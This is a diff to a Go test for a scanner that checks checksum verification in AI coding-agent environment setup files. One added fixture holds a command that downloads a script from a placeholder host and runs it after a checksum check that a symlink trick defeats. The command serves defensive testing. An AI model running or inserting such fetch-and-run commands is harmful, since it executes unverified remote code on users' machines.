@@ -41,6 +41,12 @@ func TestAnnotateChecksums(t *testing.T) {
 	if err := os.Symlink("good.sha256", filepath.Join(root, "inside.sha256")); err != nil {
 		t.Fatal(err)
 	}
+	if err := os.Symlink("t.sh", filepath.Join(root, "sums-to-target.sha256")); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Symlink("good.sha256", filepath.Join(root, "target-to-sums.sh")); err != nil {
+		t.Fatal(err)
+	}
 	if err := os.Symlink("/nonexistent/x", filepath.Join(root, "broken.sha256")); err != nil {
 		t.Fatal(err)
 	}
@@ -56,8 +62,10 @@ func TestAnnotateChecksums(t *testing.T) {
 		envSetup(model.HarnessCopilot, copilot, `{"setting":"step","run":`+check("dir.sha256")+`}`),
 		envSetup(model.HarnessCopilot, copilot, `{"setting":"step","run":`+check("escape.sha256")+`}`),
 		envSetup(model.HarnessCopilot, copilot, `{"setting":"step","run":`+check("inside.sha256")+`}`),
+		envSetup(model.HarnessCopilot, copilot, `{"setting":"step","run":`+check("sums-to-target.sha256")+`}`),
 		envSetup(model.HarnessCopilot, copilot, `{"setting":"step","run":`+check("broken.sha256")+`}`),
 		envSetup(model.HarnessCopilot, copilot, `{"setting":"step","run":`+check("gone.sha256")+`}`),
+		envSetup(model.HarnessCopilot, copilot, `{"setting":"step","run":"curl -fsSLo target-to-sums.sh https://x.invalid/t.sh && sha256sum -c good.sha256 && sh target-to-sums.sh"}`),
 		envSetup(model.HarnessCopilot, copilot, `{"setting":"step","run":`+check("good.sha256")+`,"working-directory":"sub"}`),
 		envSetup(model.HarnessCursor, ".cursor/environment.json", `{"setting":"install","value":`+check("good.sha256")+`}`),
 		envSetup(model.SurfaceDevcontainer, ".devcontainer/devcontainer.json", `{"setting":"postCreateCommand","command":["bash","-c",`+check("good.sha256")+`]}`),
@@ -74,11 +82,14 @@ func TestAnnotateChecksums(t *testing.T) {
 	want := []map[string][]string{
 		good,
 		{"other.sha256": {"other.sh"}},
-		nil, nil, nil, nil,
-		{"inside.sha256": {"t.sh", "u.sh"}},
-		nil, nil, nil,
+		nil, nil, nil, nil, nil, nil, nil, nil,
+		good,
+		nil,
 		good, good,
 		nil, nil, nil,
+	}
+	if got, want := items[10].ChecksumSymlinks, []string{"target-to-sums.sh"}; !slices.Equal(got, want) {
+		t.Errorf("target-to-sums ChecksumSymlinks = %q, want %q", got, want)
 	}
 	for i, item := range items {
 		if !maps.EqualFunc(item.ChecksumFiles, want[i], slices.Equal[[]string]) {
